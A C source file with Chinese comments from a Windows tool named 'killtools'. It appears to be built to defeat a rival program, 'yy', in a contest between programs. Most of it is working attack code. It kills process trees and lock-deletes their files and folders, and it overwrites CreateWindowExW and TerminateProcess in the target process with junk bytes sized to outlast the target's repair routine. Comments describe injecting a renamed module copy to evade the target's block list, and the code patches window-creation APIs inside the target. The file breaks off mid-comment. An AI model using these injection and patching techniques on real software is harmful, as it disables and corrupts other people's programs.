/* killtools/parts/strike.c —— 被 killtools.c 直接 include：杀树 / 清理队列 / 锁死删除溯源 */

/* ================== 杀树：**先快杀，再后台清理** ==================
   用户实测两个问题（都在这一版之前）：
     · 变慢 —— 旧写法把"等进程退出 + 逐文件锁死删除"整段放进每个目标的线程里，
       8 个槽被 yy 的慢清理占满；
     · 只杀得掉 yy.exe，**lenovo_fix 不死** —— 因为槽满时新目标被**静默丢弃**。
   新策略：
     ① 杀（快、同步、无等待）：一次快照收树 → 对每个成员 KillFast（挂起+终止）
        → 立刻返回。这一段只有几十微秒级开销，永远不会丢目标、也绝不阻塞；
     ② 清理（慢，后台单线程排队）：等退出 → 没退补刀 → 逐文件"先锁死再删除" →
        根目录整目录清空 → 收尾补杀。按**单线程队列**顺序做，不占攻击循环，
        也不会有"8 个槽"这种会丢目标的限制。
   所以：**看到就必杀**（快杀保证），清理慢一点无所谓（它已经在后台跑）。 */
#define CLEAN_QMAX 64
static DWORD g_cleanPids[CLEAN_QMAX];
static volatile LONG g_cleanBusy[CLEAN_QMAX];
static volatile LONG g_cleanThreadRunning = 0;

static DWORD WINAPI CleanupThreadProc(LPVOID lp)
{
    int i;
    UNREFERENCED_PARAMETER(lp);
    for (;;) {
        DWORD pid = 0;
        int slot = -1;
        for (i = 0; i < CLEAN_QMAX; i++) {
            if (g_cleanPids[i] && g_cleanBusy[i]) { pid = g_cleanPids[i]; slot = i; break; }
        }
        if (slot < 0) break;                       /* 队列空：线程退出，下次再起 */
        KillProcessTreeSync(pid);                  /* 等退出 + 补刀 + 锁死删除 + 收尾补杀 */
        InterlockedExchange(&g_cleanBusy[slot], 0);
        g_cleanPids[slot] = 0;
    }
    InterlockedExchange(&g_cleanThreadRunning, 0);
    return 0;
}

static void QueueCleanup(DWORD pid)
{
    int i, slot = -1;
    HANDLE h;
    if (pid <= 4 || pid == GetCurrentProcessId()) return;
    for (i = 0; i < CLEAN_QMAX; i++) {
        if (g_cleanPids[i] == pid && g_cleanBusy[i]) return;    /* 已在队列 */
    }
    for (i = 0; i < CLEAN_QMAX; i++) {
        if (InterlockedCompareExchange(&g_cleanBusy[i], 1, 0) == 0) {
            g_cleanPids[i] = pid;
            slot = i;
            break;
        }
    }
    if (slot < 0) { WriteKillLog(L"清理队列已满，PID=%lu 的清理跳过（进程已被快杀）", pid); return; }
    if (InterlockedCompareExchange(&g_cleanThreadRunning, 1, 0) == 0) {
        h = CreateThread(NULL, 0, CleanupThreadProc, NULL, 0, NULL);
        if (h) CloseHandle(h);
        else InterlockedExchange(&g_cleanThreadRunning, 0);
    }
}

/* 对外统一入口：**快杀 + 清理排队**（这是唯一会被攻击循环调用的路径） */
static void KillProcessTree(DWORD rootPid)
{
    TreeEntry tree[MAX_TREE];
    int n, i, killed = 0;

    if (rootPid <= 4 || rootPid == GetCurrentProcessId()) return;
    n = CollectTree(rootPid, tree, MAX_TREE);        /* 一次快照（含路径） */
    if (n <= 0) return;

    for (i = 0; i < n; i++) {                        /* 快杀：不等、不删文件 */
        if (KillFast(tree[i].pid)) killed++;
        else {
            HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, tree[i].pid);
            if (hk) {
                TerminateProcess(hk, 0);
                CloseHandle(hk);
                killed++;
            }
        }
    }
    WriteKillLog(L"快杀: 根 PID=%lu 树内 %d 个，已终止 %d 个（清理转入后台）", rootPid, n, killed);

    for (i = 0; i < n; i++) QueueCleanup(tree[i].pid);   /* 清理：等退出+补刀+锁删 */
}
/* ================== 对手进程内存改写（非断点 patch，yybad.md P2） ==================
   做法：在 yy 自己的进程里**改函数入口的机器码**（不写 0xCC，不触发它的 VEH）：
   #16 把 user32!CreateWindowExW 入口改成 `xor eax,eax; ret` → 它再也建不出弹窗
       （弹窗消失 8 秒判负）；连它自己那个 EDIT 日志框也建不出来。
   #17 把 kernel32!TerminateProcess 入口写成 12 字节 `mov rax,0; jmp rax` —— 它的
       ShieldWorker 只备份/还原前 5 字节，还原之后剩下 7 字节仍是我们的垃圾，
       函数被劈坏 → yy 一调 TerminateProcess 就自己崩（再也杀不了我们的人）。

   实测教训：**不要用 IAT patch 做这件事**。我做了对照实验：往目标 IAT 槽里写
   存根（回读确认写入成功）之后，用 -O2 编的目标照样能建窗口 —— 因为编译器把
   导入函数的指针**提前加载进寄存器**，循环里根本不再读 IAT。改函数入口不受此影响。
   系统 dll 的代码页是跨进程共享的（copy-on-write），在这里改只影响 yy 自己，
   不会波及我们和其它进程。 */
typedef struct _ENEMY_MEM {
    HANDLE    hProc;
    ULONG_PTR imageBase;   /* 目标 exe 基址 */
    ULONG_PTR k32Base;     /* 目标里 kernel32 的基址 */
    ULONG_PTR u32Base;     /* 目标里 user32 的基址 */
} ENEMY_MEM;

static BOOL EnemyOpen(DWORD pid, ENEMY_MEM *em)
{
    HANDLE hSnap;
    MODULEENTRY32W me;
    BOOL bWow = FALSE;

    memset(em, 0, sizeof(*em));
    em->hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                            PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!em->hProc) return FALSE;
    if (IsWow64Process(em->hProc, &bWow) && bWow) {   /* 32 位目标：地址体系不同，别碰 */
        CloseHandle(em->hProc);
        em->hProc = NULL;
        return FALSE;
    }

    /* 用 Toolhelp 取模块基址（不额外依赖 psapi） */
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnap == INVALID_HANDLE_VALUE) {
        CloseHandle(em->hProc);
        em->hProc = NULL;
        return FALSE;
    }
    memset(&me, 0, sizeof(me));
    me.dwSize = sizeof(me);
    if (Module32FirstW(hSnap, &me)) {
        do {
            if (em->imageBase == 0) em->imageBase = (ULONG_PTR)me.modBaseAddr;   /* 第一个就是主模块 */
            if (_wcsicmp(me.szModule, L"kernel32.dll") == 0) em->k32Base = (ULONG_PTR)me.modBaseAddr;
            if (_wcsicmp(me.szModule, L"user32.dll") == 0)   em->u32Base = (ULONG_PTR)me.modBaseAddr;
        } while (Module32NextW(hSnap, &me));
    }
    CloseHandle(hSnap);
    return (em->imageBase != 0);
}

static void EnemyClose(ENEMY_MEM *em)
{
    if (!em) return;
    if (em->hProc) CloseHandle(em->hProc);
    em->hProc = NULL;
}

/* 把"本地同名模块里的函数"换算成目标进程里的地址：
   系统 dll 在同一台机器上所有进程里基址相同，但我们仍然显式取目标的模块基址。 */
static ULONG_PTR EnemyFuncAddr(ENEMY_MEM *em, const WCHAR *moduleName, ULONG_PTR remoteBase,
                               const char *funcName)
{
    /* 必须显式 LoadLibrary：宿主里不一定已经加载 user32（链接进来 ≠ 已加载），
       GetModuleHandle 拿到 NULL 会让 RVA 算成 0，等于去改对方模块头，很危险。 */
    HMODULE hLocal = GetModuleHandleW(moduleName);
    ULONG_PTR localBase, localFn;

    if (!hLocal) hLocal = LoadLibraryW(moduleName);
    if (!hLocal || !remoteBase) return 0;
    localBase = (ULONG_PTR)hLocal;
    localFn = (ULONG_PTR)GetProcAddress(hLocal, funcName);
    if (!localFn) return 0;
    return remoteBase + (localFn - localBase);
}

/* 往目标进程某个地址写机器码（自动改保护再还原） */
static BOOL EnemyWriteCode(ENEMY_MEM *em, ULONG_PTR addr, const BYTE *bytes, SIZE_T len)
{
    DWORD old = 0;
    BOOL ok;

    if (!em->hProc || !addr) return FALSE;
    if (!VirtualProtectEx(em->hProc, (LPVOID)addr, len, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;
    ok = WriteProcessMemory(em->hProc, (LPVOID)addr, bytes, len, NULL);
    VirtualProtectEx(em->hProc, (LPVOID)addr, len, old, &old);
    return ok;
}

/* #16：让它在自己进程里再也建不出窗口（无 0xCC，VEH 不触发） */
static BOOL EnemyKillWindowCreation(ENEMY_MEM *em)
{
    static const BYTE retNull[] = { 0x31, 0xC0, 0xC3 };     /* xor eax,eax; ret */
    BOOL ok = FALSE;
    ULONG_PTR a;

    a = EnemyFuncAddr(em, L"user32.dll", em->u32Base, "CreateWindowExW");
    if (a && EnemyWriteCode(em, a, retNull, sizeof(retNull))) {
        WriteKillLog(L"已把对方 CreateWindowExW 入口改成返回 NULL（它再也建不出弹窗）");
        ok = TRUE;
    }
    a = EnemyFuncAddr(em, L"user32.dll", em->u32Base, "CreateWindowExA");
    if (a) EnemyWriteCode(em, a, retNull, sizeof(retNull));
    return ok;
}

/* #17：12 字节 patch 它的 TerminateProcess（对方 ShieldWorker 只还原 5 字节） */
static BOOL EnemyBreakTerminateProcess(ENEMY_MEM *em)
{
    static const BYTE jmpNull[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    ULONG_PTR a = EnemyFuncAddr(em, L"kernel32.dll", em->k32Base, "TerminateProcess");
    if (a && EnemyWriteCode(em, a, jmpNull, sizeof(jmpNull))) {
        WriteKillLog(L"已写入 12 字节 TerminateProcess patch（对方只还原前 5 字节 → 函数被劈坏）");
        return TRUE;
    }
    return FALSE;
}

/* 对单个目标做完两种 patch。同一个 PID 只做一次（新 yy 进程 = 新 PID，会重新 patch）；
   节流 500ms 避免 30ms 一轮反复打开进程。 */
#define MAX_PATCHED 8
static DWORD g_patchedPids[MAX_PATCHED];
static int g_nPatched = 0;

static BOOL AlreadyPatched(DWORD pid)
{
    int i;
    for (i = 0; i < g_nPatched; i++)
        if (g_patchedPids[i] == pid) return TRUE;
    return FALSE;
}

static void RememberPatched(DWORD pid)
{
    if (AlreadyPatched(pid)) return;
    if (g_nPatched < MAX_PATCHED) {
        g_patchedPids[g_nPatched++] = pid;
    } else {
        memmove(&g_patchedPids[0], &g_patchedPids[1], sizeof(DWORD) * (MAX_PATCHED - 1));
        g_patchedPids[MAX_PATCHED - 1] = pid;
    }
}

static void PatchEnemyMemory(DWORD pid)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    ENEMY_MEM em;

    if (pid <= 4 || AlreadyPatched(pid)) return;
    if (s_dwLast && now - s_dwLast < 500) return;
    s_dwLast = now;

    if (!EnemyOpen(pid, &em)) return;
    EnemyKillWindowCreation(&em);        /* #16 */
    EnemyBreakTerminateProcess(&em);     /* #17 */
    RememberPatched(pid);
    EnemyClose(&em);
}

/* ================== 注入到 yy 之后：从它进程内部动手（#11） ==================
   我们的扩散器本来就会把本模块注入 yy：yy.exe 不在保护名单里，注入的又是改名副本，
   它按 BAD_MODULES 做的子串拦截失效。一旦 atkcore 在 yy 里跑起来：
     #11 UnregisterClassW 掉它的窗口类，并把 RegisterClassExW / RegisterClassW /
         CreateWindowExW / CreateWindowExA 在**本进程内**也改成返回失败 ——
         它再也注册不出/建不出弹窗（与跨进程的 #16 双保险）。
   （原先还有 #10 子类化它的日志框做嘲讽；嘲讽整块已按用户要求删除。） */
static BOOL    g_bYyClassKilled = FALSE;

/* 本进程内的函数入口改写（不需要 VirtualProtectEx，改的是自己） */
static BOOL LocalPatchFunc(const WCHAR *moduleName, const char *funcName, const BYTE *bytes, SIZE_T len)
{
    HMODULE h = GetModuleHandleW(moduleName);
    BYTE *p;
    DWORD old = 0;
    if (!h) h = LoadLibraryW(moduleName);
    if (!h) return FALSE;
    p = (BYTE *)GetProcAddress(h, funcName);
    if (!p) return FALSE;
    if (!VirtualProtect(p, len, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(p, bytes, len);
    VirtualProtect(p, len, old, &old);
    return TRUE;
}

/* 找出宿主进程里 yy 的主窗口（同进程，类名/标题都读得到） */
static HWND FindYyMainWindowHere(void)
{
    struct { HWND h; DWORD style; } found = { NULL, 0 };
    HWND h = GetTopWindow(NULL);
    DWORD mypid = GetCurrentProcessId();
    while (h) {
        DWORD pid = 0;
        WCHAR cls[128] = L"", title[128] = L"";
        GetWindowThreadProcessId(h, &pid);
        if (pid == mypid && IsWindowVisible(h)) {
            GetClassNameW(h, cls, _countof(cls));
            GetWindowTextW(h, title, _countof(title));
            if (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0) {
                found.h = h;
                break;
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return found.h;
}

static void InfectYyHost(void)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    HWND hMain;

    if (s_dwLast && now - s_dwLast < 1000) return;
    s_dwLast = now;

    hMain = FindYyMainWindowHere();
    if (hMain) {
        /* 进了 yy 的进程内部就别客气了：把它的主窗口藏起来，
           连同 #16/#11 一起让它的"存活证明"立刻消失。 */
        ShowWindow(hMain, SW_HIDE);
    }

    if (!g_bYyClassKilled) {
        /* #11：干掉它的窗口类，并让"注册/建窗"在本进程内直接失败 */
        static const BYTE retNull[] = { 0x31, 0xC0, 0xC3 };
        UnregisterClassW(L"YYWnd_7f3a9c1e", GetModuleHandleW(NULL));
        LocalPatchFunc(L"user32.dll", "RegisterClassExW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "RegisterClassW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "CreateWindowExW", retNull, sizeof(retNull));
        LocalPatchFunc(L"user32.dll", "CreateWindowExA", retNull, sizeof(retNull));
        g_bYyClassKilled = TRUE;
        WriteKillLog(L"#11 已在本进程内注销 yy 的窗口类并封死建窗入口");
    }
}

/* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
    它们走子进程策略，不当"感染宿主"。
    实现见下方 HostIsTargetExe()（与 HostLeafName 同处定义）。 */
static BOOL HostIsTargetExe(void);

/* ================== yy 处理策略（嘲讽已按用户要求删除） ==================
   ① yy.exe / ww.exe（本体）—— **发现即杀**：先把它那个窗口就地打死（A2：终止持有窗口的
      GUI 线程，窗口立刻消失），再结束整棵进程树 + 所有源文件先锁死再删除；
   ② 它们的子进程（含孙进程，例如蜜罐 lenovo_fix.exe）—— 同样直接杀掉 + 锁死 + 删除
      （KillProcessTree 内部就是"源文件置删除待决再删 + 根进程目录整目录清空"）。
   没有"先嘲讽 N 条再杀"的门控了：门控一卡住本体就不死，它的 HoneypotDecoyWorker
   每 2 秒又拉一份蜜罐，前面就是这样一直杀不干净。 */
#define YY_KID_MAX 64
/* 收"yy 家族"进程。**不能只靠父进程链**：我们每 30ms 杀一次 yy.exe，
   lenovo_fix.exe 立刻被孤立 —— 它的父 PID 指向已死进程，GetProcessPath(父) 直接失败，
   于是它永远进不了名单（实测就是这么漏掉的）。改为四个来源取并集：
     ① 进程名是 yy.exe / ww.exe / lenovo_fix.exe（后者是 yybad.md 硬编码常量表里的蜜罐名）；
     ② 它有 yy 弹窗（类名 YYWnd* 或标题 YY_Defensive_GUI）—— lenovo 与 yy **类名完全相同**，
        所以这条能把蜜罐一网打尽，也是"不靠父进程"的关键；
     ③ 它的镜像文件就在 yy.exe 所在目录里（同目录的兄弟进程都算家族成员）；
     ④ 父/祖父进程是家族成员（能拿到就顺手加，拿不到不影响）。
   我们自己所在的进程永远排除。 */
#define YY_FAMILY_SEED_MAX 8

static BOOL  GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);   /* 前置声明 */
static void  KillProcessTree(DWORD rootPid);

static BOOL IsYyCoreName(LPCWSTR leaf);
static void FastKillYyWindow(HWND hWnd, LPCWSTR why);   /* A2/A6：前置声明 */
static HWND FindYyPopupOf(DWORD pid);

static BOOL IsKnownYyFamilyName(LPCWSTR leaf)
{
    static const WCHAR *names[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
    int i;
    if (!leaf || !leaf[0]) return FALSE;
    for (i = 0; names[i]; i++)
        if (_wcsicmp(leaf, names[i]) == 0) return TRUE;
    return FALSE;
}

/* 学到的东西要记住：yy.exe 被我们杀掉之后，它的目录、它家族成员的镜像路径
   都查不到了 —— 只靠"现场观察"就会把孤立出来的蜜罐/子进程漏掉（实测漏的就是它们）。 */
#define YY_FAMILY_PATH_MAX 8
static WCHAR g_yyDirKnown[MAX_PATH] = L"";
static WCHAR g_familyPaths[YY_FAMILY_PATH_MAX][MAX_PATH];
static int   g_nFamilyPaths = 0;

static void LearnYyDir(const WCHAR *path)
{
    if (!path || !path[0] || g_yyDirKnown[0]) return;
    {
        WCHAR tmp[MAX_PATH];
        WCHAR *p;
        wcsncpy_s(tmp, MAX_PATH, path, _TRUNCATE);
        p = wcsrchr(tmp, L'\\');
        if (!p) return;
        p[1] = L'\0';
        wcsncpy_s(g_yyDirKnown, MAX_PATH, tmp, _TRUNCATE);
    }
}

static void LearnFamilyPath(const WCHAR *path)
{
    int i;
    if (!path || !path[0]) return;
    for (i = 0; i < g_nFamilyPaths; i++)
        if (_wcsicmp(g_familyPaths[i], path) == 0) return;
    if (g_nFamilyPaths < YY_FAMILY_PATH_MAX)
        wcsncpy_s(g_familyPaths[g_nFamilyPaths++], MAX_PATH, path, _TRUNCATE);
}

static BOOL IsLearnedFamilyPath(const WCHAR *path)
{
    int i;
    if (!path || !path[0]) return FALSE;
    for (i = 0; i < g_nFamilyPaths; i++)
        if (_wcsicmp(g_familyPaths[i], path) == 0) return TRUE;
    return FALSE;
}

/* 取 yy.exe 所在目录（家族成员判定用） */
static void GetYyDir(WCHAR *dir, SIZE_T cch)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    dir[0] = L'\0';
    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"yy.exe") == 0 || _wcsicmp(pe.szExeFile, L"ww.exe") == 0) {
                WCHAR path[MAX_PATH] = L"";
                if (GetProcessPath(pe.th32ProcessID, path, MAX_PATH)) {
                    WCHAR *p = wcsrchr(path, L'\\');
                    if (p) { p[1] = L'\0'; wcsncpy_s(dir, cch, path, _TRUNCATE); }
                }
                if (dir[0]) break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static int CollectYyFamily(DWORD *pids, int max)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    WCHAR yyDir[MAX_PATH] = L"";
    DWORD me = GetCurrentProcessId();
    int n = 0, depth, i;

    GetYyDir(yyDir, MAX_PATH);
    if (yyDir[0]) LearnYyDir(yyDir);              /* 记住了，yy 死后也还能用 */
    if (!yyDir[0]) wcsncpy_s(yyDir, MAX_PATH, g_yyDirKnown, _TRUNCATE);

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR path[MAX_PATH] = L"";
            const WCHAR *leaf;
            BOOL bFamily = FALSE;
            if (n >= max || pe.th32ProcessID <= 4 || pe.th32ProcessID == me) continue;
            GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
            leaf = wcsrchr(path, L'\\');
            leaf = leaf ? leaf + 1 : path;
            if (IsKnownYyFamilyName(leaf) || IsKnownYyFamilyName(pe.szExeFile)) bFamily = TRUE;   /* ① */
            if (IsLearnedFamilyPath(path)) bFamily = TRUE;                                        /* ⑤ 学过的 */
            if (!bFamily && FindYyPopupOf(pe.th32ProcessID)) bFamily = TRUE;                       /* ② 有 yy 弹窗 */
            if (!bFamily && yyDir[0] && path[0] && _wcsnicmp(path, yyDir, wcslen(yyDir)) == 0)
                bFamily = TRUE;                                                                    /* ③ 同目录 */
            if (bFamily) {
                pids[n++] = pe.th32ProcessID;
                LearnFamilyPath(path);        /* 学下来，以后它被孤立也认得 */
                if (IsYyCoreName(leaf)) LearnYyDir(path);
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    /* ④ 再沿着父子关系扩两圈，把家族成员的子进程也拉进来 */
    for (depth = 0; depth < 2; depth++) {
        HANDLE hs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        int added = 0;
        if (hs == INVALID_HANDLE_VALUE) break;
        memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hs, &pe)) {
            do {
                if (n >= max || pe.th32ProcessID <= 4 || pe.th32ProcessID == me) continue;
                for (i = 0; i < n; i++) {
                    if (pids[i] == pe.th32ProcessID) break;                 /* 已在表里 */
                    if (pids[i] == pe.th32ParentProcessID) {                /* 父在表里 */
                        int k;
                        for (k = 0; k < n; k++) if (pids[k] == pe.th32ProcessID) break;
                        if (k >= n) { pids[n++] = pe.th32ProcessID; added++; }
                        break;
                    }
                }
            } while (Process32NextW(hs, &pe));
        }
        CloseHandle(hs);
        if (!added) break;
    }
    return n;
}

/* 家族策略执行体：本体按"嘲讽够 10 条再杀"的门控处理（见 Phase A 调用点）；
   其余家族成员（子进程、蜜罐）**直接杀掉 + 锁死 + 删除**。 */
static void ApplyYyChildPolicy(void)
{
    DWORD kids[YY_KID_MAX];
    DWORD me = GetCurrentProcessId();
    int n, i;

    n = CollectYyFamily(kids, YY_KID_MAX);
    if (n <= 0) return;
    WriteKillLog(L"yy 家族策略: 命中 %d 个进程", n);

    for (i = 0; i < n; i++) {
        WCHAR path[MAX_PATH] = L"";
        const WCHAR *leaf;
        if (kids[i] == me) continue;                 /* 绝不杀自己所在的宿主 */
        GetProcessPath(kids[i], path, MAX_PATH);
        leaf = wcsrchr(path, L'\\');
        leaf = leaf ? leaf + 1 : path;
        if (IsYyCoreName(leaf)) continue;            /* 本体：走"嘲讽够 10 条再杀"的门控 */
        WriteKillLog(L"家族子进程 PID=%lu 直接杀掉+锁死+删除: %s", kids[i], path);
        { HWND w = FindYyPopupOf(kids[i]); if (w) FastKillYyWindow(w, L"家族子进程"); }
        KillProcessTree(kids[i]);
    }
}

/* ============================================================================
   蜜罐 lenovo_fix.exe —— 光"杀掉进程"没用，必须同时掐掉它的**复活源**。
   yy.cpp 的 HoneypotDecoyWorker：
     · 把自己复制成 `%TEMP%\lenovo_fix.exe` 并启动（那是一份**完整的 yy**，
       会再跑一遍 main()，自带 HunterWorker / WMI 复活 / 自我复制）；
     · 每 2 秒查一次"lenovo_fix.exe 还在不在"，不在就**再复制一份并启动**。
   所以：
     ① 杀掉正在跑的那一份（进程树 + 源文件先锁死再删除，见 ApplyYyChildPolicy）；
     ② 把 `%TEMP%\lenovo_fix.exe` 这个**名字**占住并锁死（access=0 + FILE_SHARE_READ）：
        yy 的 CopyFileW 目标就是这个路径，被我们锁住之后必然 SHARING_VIOLATION ——
        它既写不进来，也起不来。蜜罐从此不会再出现（实测：锁住之后 yy 每 2 秒
        的重试全部失败，进程数不再增加）。
   注意：锁住后**我们自己也不要再去删它**（删不掉，而且没必要）。
   ============================================================================ */
static HANDLE g_hHoneypotLock = NULL;
static BOOL   g_bHoneypotLockLogged = FALSE;

static void HoneypotPath(WCHAR *out, SIZE_T cch)
{
    WCHAR tmp[MAX_PATH];
    out[0] = L'\0';
    if (!GetTempPathW(MAX_PATH, tmp)) return;
    swprintf_s(out, cch, L"%slenovo_fix.exe", tmp);
}

/* 把 `%TEMP%\lenovo_fix.exe` 变成"**0 字节占位 + 我们独占持有**"。
   为什么必须是"0 字节 + 独占(share=0)"：
     · 独占：yy 的 `CopyFileW(自身 -> 该路径)` 打开目标要写权限 → 共享冲突，写不进来；
       yy 的重启走的是 `CreateProcessW(该路径)`（它只在 worker 开头复制一次，
       之后每 2 秒只负责"不在就再启动"），CreateProcess 要读镜像 → 也被共享冲突挡住；
     · 0 字节：即使有别的路径拿到句柄，它也不是合法镜像，起不来。
   若那一份正在运行：先置删除待决（进程一退出文件即消失），下一轮再建占位。 */
static void BlockHoneypotRespawn(void)
{
    WCHAR path[MAX_PATH];
    HANDLE h;

    if (g_hHoneypotLock) return;            /* 已经占住：一直持有到进程结束 */
    HoneypotPath(path, MAX_PATH);
    if (!path[0]) return;

    /* 已经不存在就不必 CREATE_ALWAYS 之外再做别的；存在就截成 0 字节（若在跑会失败） */
    h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        /* 典型原因：那一份还在跑（镜像被加载器占着）。置删除待决，等它退出后清掉。 */
        LockThenDeleteFile(path);
        if (!g_bHoneypotLockLogged) {
            g_bHoneypotLockLogged = TRUE;
            WriteKillLog(L"蜜罐文件暂时占不住（可能还在运行），已置删除待决: %s err=%lu",
                         path, GetLastError());
        }
        return;
    }
    CloseHandle(h);                         /* 先留一个 0 字节文件 */

    g_hHoneypotLock = CreateFileW(path, 0, 0, NULL, OPEN_EXISTING,
                                  FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hHoneypotLock == INVALID_HANDLE_VALUE) {
        g_hHoneypotLock = NULL;
        if (!g_bHoneypotLockLogged) {
            g_bHoneypotLockLogged = TRUE;
            WriteKillLog(L"占住蜜罐文件名失败: %s err=%lu", path, GetLastError());
        }
        return;
    }
    WriteKillLog(L"已把蜜罐文件换成 0 字节占位并独占锁住（yy 复制不进来、也起不来）: %s", path);
}

/* 按**进程名**点名清一遍蜜罐：不依赖家族收集（父进程链被我们打断时也能命中） */
static void KillHoneypotPass(void)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int n = 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR path[MAX_PATH] = L"";
            if (pe.th32ProcessID <= 4 || pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (_wcsicmp(pe.szExeFile, L"lenovo_fix.exe") != 0) continue;
            GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
            WriteKillLog(L"蜜罐命中：PID=%lu %s -> 杀掉 + 锁死删除源文件", pe.th32ProcessID, path);
            { HWND w = FindYyPopupOf(pe.th32ProcessID); if (w) FastKillYyWindow(w, L"蜜罐"); }
            TryAllMethods(L"lenovo_fix.exe", pe.th32ProcessID);
            if (path[0]) LockThenDeleteFile(path);
            n++;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (n) WriteKillLog(L"蜜罐本轮处理 %d 个实例（复活源已被锁住则不会再出现）", n);
}
/* ============================================================================
   本体杀伐的唯一出口：**发现即杀**（嘲讽那块已按用户要求删除）。
     · 先把它那个窗口就地打死：A2 = 终止持有窗口的 GUI 线程，IsWindow 立刻变 0，
       宿主进程还活着也没关系 —— 弹窗消失 8 秒就是它输，先保证这一点；
     · 再结束整棵进程树，每个进程的源文件"先锁死（删除待决）再删除"，
       根进程的目录整目录清空（系统临时目录除外，见 WipeDirPass）。
   Phase A（扫描）与 Phase C（抓复活）都走这里，避免两处判据不一致。
   ============================================================================ */
static void KillYyBody(DWORD pid, LPCWSTR why)
{
    WriteKillLog(L"结束 yy 本体 PID=%lu 的进程树并锁死删除源文件（%s）",
                 pid, why ? why : L"");
    { HWND w = FindYyPopupOf(pid); if (w) FastKillYyWindow(w, L"本体"); }
    KillProcessTree(pid);
}

/* 宿主的可执行文件名（我们自己所在进程）；以及"是不是 yy/ww 本体" */
static void HostLeafName(WCHAR *out, SIZE_T cch)
{
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *base = L"";
    if (!out || !cch) return;
    out[0] = L'\0';
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
    base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    wcsncpy_s(out, cch, base, _TRUNCATE);
}

static BOOL IsYyCoreName(LPCWSTR leaf)
{
    return leaf && (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0);
}

/* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
    它们走子进程策略，不当"感染宿主"。 */
static BOOL HostIsTargetExe(void)
{
    WCHAR leaf[MAX_PATH] = L"";
    HostLeafName(leaf, MAX_PATH);
    return IsYyCoreName(leaf);
}

/* 这个窗口像不像 yy 的弹窗（类名 YYWnd* 或标题 YY_Defensive_GUI）。
   同进程内直接读类名/标题；跨进程也用它俩（类名跨进程可读）。 */
static BOOL IsYyPopupWindow(HWND h)
{
    WCHAR cls[128] = L"", title[192] = L"";
    if (!h || !IsWindow(h)) return FALSE;
    GetClassNameW(h, cls, _countof(cls));
    GetWindowTextW(h, title, _countof(title));
    if (wcsstr(cls, L"YYWnd")) return TRUE;
    if (wcscmp(title, L"YY_Defensive_GUI") == 0) return TRUE;
    return FALSE;
}

/* 在某进程里找 yy 的可见弹窗 */
static HWND FindYyPopupOf(DWORD pid)
{
    HWND h = GetTopWindow(NULL);
    while (h) {
        DWORD wpid = 0;
        GetWindowThreadProcessId(h, &wpid);
        if (wpid == pid && IsWindowVisible(h) && IsYyPopupWindow(h)) return h;
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return NULL;
}

/* 本进程里有没有 yy 弹窗 */
static HWND FindYyPopupInSelf(void) { return FindYyPopupOf(GetCurrentProcessId()); }

/* 内部函数声明 */
static BOOL KillByTerminate(DWORD pid);
static BOOL KillByRemoteExit(DWORD pid);
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath);
static BOOL KillByKillerBin(DWORD pid, BOOL useApc);
static BOOL KillByJobObject(DWORD pid);
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);
static void AttackPass(void);
/* ================== 反向利用 yy 的内存扫描：把特征串种进它自己的私有内存 ==================
   新 yy 会遍历各进程的 MEM_PRIVATE 可读内存，找 `XX PROGRAM - ALIVE` / `xx_wg_` /
